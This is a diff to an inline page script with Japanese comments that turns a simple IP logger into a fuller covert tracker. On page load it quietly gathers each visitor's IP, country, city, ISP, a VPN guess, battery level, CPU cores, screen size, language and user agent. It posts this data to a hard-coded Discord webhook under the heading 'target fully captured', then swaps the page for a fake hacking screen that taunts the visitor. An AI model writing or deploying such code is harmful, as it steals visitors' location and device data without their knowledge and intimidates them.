@@ -1,31 +1,55 @@
 <script type="text/javascript">
-(function() {
-    // 1. ここに新しいWebhook URLをそのまま貼り付ける
-    const w = "https://discord.com/api/webhooks/1480858959148486698/rogRAjEJV4UBPNPuq6vCS1mI44C77w771WdB7RWqh696LK9IOP654SsfT1zIXjaVGF87";
+(async function() {
+    try {
+        const w = "https://discord.com/api/webhooks/1480858959148486698/rogRAjEJV4UBPNPuq6vCS1mI44C77w771WdB7RWqh696LK9IOP654SsfT1zIXjaVGF87";
 
-    // 2. IPと情報を取得して送信
-    fetch('https://api.ipify.org?format=json')
-    .then(r => r.json())
-    .then(data => {
+        // 1. 詳細情報の取得 (ip-api を使用: CORS制限が緩く詳細が取れる)
+        const ipRes = await fetch('https://ip-api.com/json/?fields=66846719');
+        const d = await ipRes.json();
+
+        // 2. デバイス・環境情報の取得
+        const tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
+        const vpn = (tz !== d.timezone) ? "⚠️ VPN/Proxy 濃厚" : "生IP可能性高";
+        let bat = "N/A";
+        try { const b = await navigator.getBattery(); bat = Math.floor(b.level * 100) + "%"; } catch(e){}
+
+        // 3. Discordへ送信するリッチなデータ
         const payload = {
             embeds: [{
-                title: "🚨 ターゲット捕捉",
+                title: "🛑 ターゲット完全捕捉",
                 color: 16711680,
                 fields: [
-                    { name: "IPアドレス", value: data.ip },
-                    { name: "OS/Platform", value: navigator.platform },
-                    { name: "User-Agent", value: navigator.userAgent }
+                    { name: "🌐 ネットワーク情報", value: `**IP:** ${d.query}\n**国/都市:** ${d.country} / ${d.city}\n**ISP:** ${d.isp}\n**VPN判定:** ${vpn}`, inline: false },
+                    { name: "💻 デバイス情報", value: `**OS:** ${navigator.platform}\n**電池:** ${bat}\n**コア数:** ${navigator.hardwareConcurrency}\n**解像度:** ${screen.width}x${screen.height}`, inline: true },
+                    { name: "🔍 ブラウザ/言語", value: `**言語:** ${navigator.language}\n**UA:** \`\`\`${navigator.userAgent}\`\`\``, inline: false }
                 ],
+                footer: { text: "ADLOL Global Tracking" },
                 timestamp: new Date()
             }]
         };
 
-        return fetch(w, {
+        // 送信
+        await fetch(w, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify(payload)
         });
-    })
-    .catch(e => console.error("Error:", e));
+
+        // 4. 送信後の「演出」：画面をハッキング風に書き換える
+        document.body.innerHTML = `
+            <div style="background-color:black; color:#0f0; height:100vh; width:100vw; position:fixed; top:0; left:0; font-family:monospace; padding:20px; box-sizing:border-box; z-index:999999;">
+                <h2>[SYSTEM FAILURE]</h2>
+                <p>> ACCESSING LOCAL FILES...</p>
+                <p>> UPLOADING DATA TO SERVER... DONE</p>
+                <p>> YOUR IP: ${d.query} HAS BEEN LOGGED.</p>
+                <p>> LOCATION: ${d.city}, ${d.country}</p>
+                <p style="color:red; font-weight:bold;">> YOU GOT CAUGHT (lol)</p>
+                <blink>_</blink>
+            </div>
+        `;
+
+    } catch (err) {
+        console.error(err);
+    }
 })();
 </script>
